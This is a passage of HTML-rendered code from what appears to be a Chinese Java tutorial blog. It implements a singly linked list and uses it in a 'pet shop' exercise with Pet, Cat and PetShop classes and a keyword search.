<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.next.setNode(index, data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">containsNode</span><span class="params">(E data)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.data.equals(data)) &#123;<span class="comment">//对象比较</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.next == <span class="literal">null</span>) &#123;<span class="comment">//无后续节点</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.next.containsNode(data);<span class="comment">//向后继续判断</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">removeNode</span><span class="params">(Node previous, E data)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.data.equals(data)) &#123;</span><br><span class="line">                previous.next = <span class="built_in">this</span>.next;<span class="comment">//空出当前节点</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.next != <span class="literal">null</span>) &#123; <span class="comment">//有后续节点</span></span><br><span class="line">                    <span class="built_in">this</span>.next.removeNode(<span class="built_in">this</span>, data); <span class="comment">//向后继续删除</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的成员----------</span></span><br><span class="line">    <span class="keyword">private</span> Node root; <span class="comment">//保存根元素</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> count;<span class="comment">//保存数据个数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> foot;<span class="comment">//描述的是操作数组的脚标</span></span><br><span class="line">    <span class="keyword">private</span> Object[] returnData;<span class="comment">//返回的数据保存</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的方法----------</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (e == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(e);<span class="comment">//创建一个新节点</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.root == <span class="literal">null</span>) &#123; <span class="comment">//现在没有根节点</span></span><br><span class="line">            <span class="built_in">this</span>.root = newNode; <span class="comment">//现在第一个节点作为根节点</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.root.addNode(newNode);<span class="comment">//将新节点保存在合适的位置</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//return this.root == null;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.count == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object[] toArray() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;<span class="comment">//无数据</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//脚标清0</span></span><br><span class="line">        System.out.println(count);</span><br><span class="line">        <span class="built_in">this</span>.returnData = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="built_in">this</span>.count];<span class="comment">//根据已有的长度开辟数组</span></span><br><span class="line">        <span class="built_in">this</span>.root.toArrayNode();<span class="comment">//利用Node类进行递归数据获取</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.returnData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="built_in">this</span>.count) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//索引数据的获取应该由Node类完成</span></span><br><span class="line">        <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//重置索引的下标</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.root.getNode(index);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, E data)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="built_in">this</span>.count) &#123;</span><br><span class="line">            <span class="keyword">return</span>;<span class="comment">//方法结束</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//索引数据的获取应该由Node类完成</span></span><br><span class="line">        <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//重置索引的下标</span></span><br><span class="line">        <span class="built_in">this</span>.root.setNode(index, data);<span class="comment">//修改数据</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(E data)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.root.containsNode(data);<span class="comment">//交给Node类判断</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(E data)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.contains(data)) &#123; <span class="comment">//判断数据是否存在</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.root.data.equals(data)) &#123; <span class="comment">//根节点为要删除节点</span></span><br><span class="line">                <span class="built_in">this</span>.root = <span class="built_in">this</span>.root.next; <span class="comment">//根的下一个节点</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">//交由Node类负责删除</span></span><br><span class="line">                <span class="built_in">this</span>.root.next.removeNode(<span class="built_in">this</span>.root, data);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.count--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clean</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.root = <span class="literal">null</span>; <span class="comment">//后续所有的都没了</span></span><br><span class="line">        <span class="built_in">this</span>.count = <span class="number">0</span>; <span class="comment">//个数清零</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test64</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ILink&lt;String&gt; all = <span class="keyword">new</span> <span class="title class_">LinkImpl</span>&lt;&gt;();</span><br><span class="line">        System.out.println(<span class="string">&quot;增加之前数据个数：&quot;</span> + all.size1() + <span class="string">&quot;、是否为空集合：&quot;</span> + all.isEmpty());</span><br><span class="line">        all.add1(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        all.add1(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">        all.add1(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;增加之后数据个数：&quot;</span> + all.size1() + <span class="string">&quot;、是否为空集合：&quot;</span> + all.isEmpty());</span><br><span class="line">        all.remove(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;删除之后数据个数：&quot;</span> + all.size1());</span><br><span class="line">        all.clean();</span><br><span class="line">        System.out.println(<span class="string">&quot;清空之后：&quot;</span> + all.size1());</span><br><span class="line">        Object[] result = all.toArray();</span><br><span class="line">        <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Object obj : result) &#123;</span><br><span class="line">                System.out.println(obj);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073718.jpg"                      alt="image-20220803163841386"                ></p><p>​    这些就是链表的基本功能，当然，这只是一个最简单最基础的单向链表实现。</p><h5 id="链表综合实战：宠物商店"><a href="#链表综合实战：宠物商店" class="headerlink" title="链表综合实战：宠物商店"></a>链表综合实战：宠物商店</h5><p>​    现在假设有一个宠物商店，里面可以出售各种宠物，要求可以实现宠物的上架与下架处理，也可以根据关键字查询出宠物的信息</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073720.jpg"                      alt="image-20220803204906676"                ></p><p>​    1、应该定义出宠物的标准</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">interface Pet&#123;</span><br><span class="line">    public String getName1();//宠物名字</span><br><span class="line">    public String getColor1();//宠物颜色</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    2、宠物商店应该以宠物的标准为主</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">PetShop</span> &#123; <span class="comment">//宠物商店</span></span><br><span class="line">    <span class="keyword">private</span> ILink1&lt;Pet&gt; allPets = <span class="keyword">new</span> <span class="title class_">LinkImpl1</span>&lt;&gt;(); <span class="comment">//保存多个宠物信息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(Pet pet)</span> &#123; <span class="comment">//追加宠物，商品上架</span></span><br><span class="line">        <span class="built_in">this</span>.allPets.add1(pet); <span class="comment">//集合中保存对象</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete1</span><span class="params">(Pet pet)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.allPets.remove(pet);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ILink1&lt;Pet&gt; <span class="title function_">search</span><span class="params">(String keyword)</span> &#123;</span><br><span class="line">        ILink1&lt;Pet&gt; searchResult = <span class="keyword">new</span> <span class="title class_">LinkImpl1</span>&lt;&gt;();<span class="comment">//保存查询结果</span></span><br><span class="line">        Object result[] = <span class="built_in">this</span>.allPets.toArray(); <span class="comment">//获取全部数据</span></span><br><span class="line">        <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Object obj : result) &#123;</span><br><span class="line">                <span class="type">Pet</span> <span class="variable">pet</span> <span class="operator">=</span> (Pet) obj;</span><br><span class="line">                <span class="keyword">if</span> (pet.getName1().contains(keyword) || pet.getColor1().contains(keyword)) &#123;</span><br><span class="line">                    searchResult.add1(pet);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> searchResult;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    3、根据宠物标准来定义宠物信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">implements</span> <span class="title class_">Pet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String color;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Cat</span><span class="params">(String name, String color)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.color = color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getColor1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> Cat)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == obj) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Cat</span> <span class="variable">cat</span> <span class="operator">=</span> (Cat) obj;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name.equals(cat.name) &amp;&amp; <span class="built_in">this</span>.color.equals(cat.color);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;【宠物猫】名字&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;、颜色：&quot;</span> + <span class="built_in">this</span>.color;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    4、实现宠物商店的操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PetShop</span> <span class="variable">shop</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PetShop</span>();</span><br><span class="line">shop.add1(<span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;黄斑狗&quot;</span>,<span class="string">&quot;绿色&quot;</span>));</span><br><span class="line">shop.add1(<span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;小强猫&quot;</span>,<span class="string">&quot;深绿色&quot;</span>));</span><br><span class="line">shop.add1(<span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;黄狗&quot;</span>,<span class="string">&quot;黄色&quot;</span>));</span><br><span class="line">shop.add1(<span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;斑点狗&quot;</span>,<span class="string">&quot;灰色&quot;</span>));</span><br><span class="line">Object result[] = shop.search(<span class="string">&quot;黄&quot;</span>).toArray();</span><br><span class="line">    <span class="keyword">for</span> (Object obj : result)&#123;</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>范例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链表实战宠物商店</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ILink1</span>&lt;E&gt; &#123; <span class="comment">//设置泛型避免安全隐患</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span>;<span class="comment">//增加节点</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size1</span><span class="params">()</span>;<span class="comment">//获取数据个数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span>;<span class="comment">//判断空集合</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object[] toArray();<span class="comment">//将集合元素以数组形式返回</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span>;<span class="comment">//根据索引找到数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, E data)</span>;<span class="comment">//修改索引数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(E data)</span>;<span class="comment">//判断数据是否存在</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(E data)</span>;<span class="comment">//数据删除方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clean</span><span class="params">()</span>;<span class="comment">//清空集合</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkImpl1</span>&lt;E&gt; <span class="keyword">implements</span> <span class="title class_">ILink1</span>&lt;E&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//保存节点的数据关系</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> E data; <span class="comment">//保存的数据</span></span><br><span class="line">        <span class="keyword">private</span> Node next; <span class="comment">//保存下一个引用</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//限制node必须有数据，有数据才有意义</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(E data)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.data = data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第一次调用：this = LinkImpl.root;</span></span><br><span class="line">        <span class="comment">//第二次调用：this = LinkImpl.root.next;</span></span><br><span class="line">        <span class="comment">//第三次调用: this = LinkImpl.root.next.next;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addNode</span><span class="params">(Node newNode)</span> &#123; <span class="comment">//保存新的node数据</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.next == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.next = newNode;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.next.addNode(newNode);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第一次调用:this = LinkImpl.root</span></span><br><span class="line">        <span class="comment">//第二次调用:this = LinkImpl.root.next</span></span><br><span class="line">        <span class="comment">//第三次调用: this = LinkImpl.root.next.next;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">toArrayNode</span><span class="params">()</span> &#123;</span><br><span class="line">            LinkImpl1.<span class="built_in">this</span>.returnData[LinkImpl1.<span class="built_in">this</span>.foot++] = <span class="built_in">this</span>.data;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.next != <span class="literal">null</span>) &#123;<span class="comment">//还有下一个数据</span></span><br><span class="line">                <span 